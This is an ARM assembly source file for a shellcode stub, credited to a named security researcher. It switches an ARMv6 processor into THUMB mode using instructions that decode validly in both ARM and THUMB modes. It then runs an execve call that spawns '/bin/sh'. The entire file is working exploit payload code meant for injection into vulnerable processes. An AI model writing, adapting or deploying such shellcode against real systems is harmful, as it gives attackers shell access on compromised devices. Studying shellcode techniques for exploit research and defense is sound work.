/* Quantum Leap shellcode stub
 * by Saumil Shah - @therealsaumil
 *
 * Shellcode to switch to THUMB mode
 * irrespective of the starting mode being ARM or THUMB
 *
 * works for ARMv6 processors that don't support
 * the Thumb2 instruction set
 */

.section .text
.global _start

_start:
.code 32
	/* ARM: SWITCH TO THUMB    THUMB: PASS THROUGH                */
	addcs	r10, pc, #25	/* add  r0, pc, #100 ; movs  r2, #143 */
	addcc	r10, pc, #21	/* add  r0, pc, 84   ; adds  r2, #143 */
	movcs	r4, sp		/* ands r5, r1       ; movs  r1, #160 */
	movcc	r4, sp		/* ands r5, r1       ; adds  r1, #160 */
	pushcs	{r1, r4, r10}	/* lsls r2, r2, #16  ; cmp   r1, #45  */
	pushcc	{r1, r4, r10}	/* lsls r2, r2, #16  ; subs  r1, #45  */
	popcs	{r1, sp, pc}	/* add  r0, rc, #8   ; cmp   r0, #189 */
	popcc	{r1, sp, pc}	/* add  r0, rc, #8   ; subs  r0, #189 */

/* code below is in Thumb mode
 * launches execve() shell for
 * testing purposes
 */

.code 16
	adr	r0, SHELL
        eor     r2, r2, r2
	strb	r2, [r0, #7]
	push	{r0, r2}
	mov	r1, sp
        mov     r7, #11
        svc	#1

.balign 4
SHELL:
	.ascii	"/bin/shX"
